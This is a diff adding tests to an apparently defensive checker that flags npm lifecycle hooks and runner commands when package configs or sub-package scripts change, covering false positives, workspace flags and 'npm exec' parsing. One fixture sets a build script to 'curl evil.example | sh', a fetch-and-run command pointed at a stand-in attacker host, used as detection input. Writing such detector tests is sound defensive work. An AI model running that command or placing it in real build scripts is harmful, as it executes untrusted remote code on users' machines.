@@ -235,3 +235,39 @@ describe("fourth review round: escapes", () => {
     expect(idxHeld("npm run build > /dev/null")).toBe(false);
   });
 });
+
+describe("fifth review round: false positives and the npm exec parser", () => {
+  const lib = (v: string) => ({ "lib/a.js": v });
+  const quiet = (scripts: object, extra: Record<string, string> = {}) => held(scripts, { ...extra, ...lib("1") }, { ...extra, ...lib("2") });
+
+  test("a config file below the root, or a hook with no runner, does not widen", () => {
+    expect(quiet({ postinstall: "node install.js" }, { "templates/app/.yarnrc.yml": "a", "test/fixtures/p/.npmrc": "a", "bunfig.toml": "a" })).toBe(false);
+    expect(quiet({ install: "node-gyp-build" }, { ".yarnrc": "a" })).toBe(false);
+    expect(held({ postinstall: "npm run build", build: "echo ok" }, { "test/fixtures/p/.npmrc": "a" }, { "test/fixtures/p/.npmrc": "b" })).toBe(false);
+  });
+
+  test("a root config file with a runner in the hook still widens", () => {
+    expect(quiet({ postinstall: "npm run build", build: "echo ok" }, { ".npmrc": "a" })).toBe(true);
+  });
+
+  test("another program's flags, quoted text and echo do not move the run", () => {
+    for (const cmd of ["rm -rf build 2>/dev/null; node install.js", "prebuild-install -r napi 2>/dev/null || node-gyp rebuild", "tar -C vendor -xf v.tgz > /dev/null && node install.js", "node install.js || echo 'workspace setup failed' >&2"]) {
+      expect(quiet({ postinstall: cmd }), cmd).toBe(false);
+    }
+  });
+
+  test("a runner command word with a workspace flag still moves the run, in any segment", () => {
+    for (const cmd of ["echo hi 2>/dev/null; pnpm -r build > /dev/null", "npm run build -w sub | tee log", "true && cd sub > /dev/null"]) {
+      expect(manifestHeld(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("npm exec options are parsed by the exec reader, not the plain flag rule", () => {
+    // sub/index.js exists, so only the exec reader's call string or wrapped runner can reach sub/package.json.
+    const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
+    const h = (hook: string) => held({ postinstall: hook, build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh"));
+    for (const cmd of ["npm exec -y -c 'cd sub && npm run build'", "npm exec --yes --call='pnpm -C sub build'", "npm exec -p pnpm -- pnpm -C sub build"]) expect(h(cmd), cmd).toBe(true);
+    // The package option is read as remote, not as an unknown flag that widens the stay-in-place forms.
+    expect(h("npm exec -c 'node ./x.js'")).toBe(false);
+  });
+});
